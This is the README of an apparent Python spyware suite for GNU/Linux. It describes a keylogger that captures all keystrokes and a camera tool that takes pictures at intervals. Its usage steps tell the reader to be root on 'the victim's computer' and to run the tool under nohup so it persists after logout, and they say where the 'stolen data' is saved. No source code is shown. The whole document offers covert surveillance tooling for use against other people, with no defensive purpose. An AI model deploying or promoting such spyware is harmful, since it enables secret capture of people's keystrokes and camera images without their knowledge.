# Python spyware
A suite of python tools dedicated to spying a machine running on GNU / linux.

## available tools

- the keylogger : capture all keyboard inputs
- the spycam : capture picture from the camera with a regular time interval

## Modules required

- Opencv2
- Pyxhook

## How to use
```diff
- Use  `--help` to find up-to-date information !
```

Be root on the victim's computer, then
```
nohup python3 linux/main.py [functions] [options]
```
> nohup (No Hang Up) is a command in Linux systems that runs the process even after logging out from the shell/terminal.

Stolen data can be found by default at `./RESULT/`
 
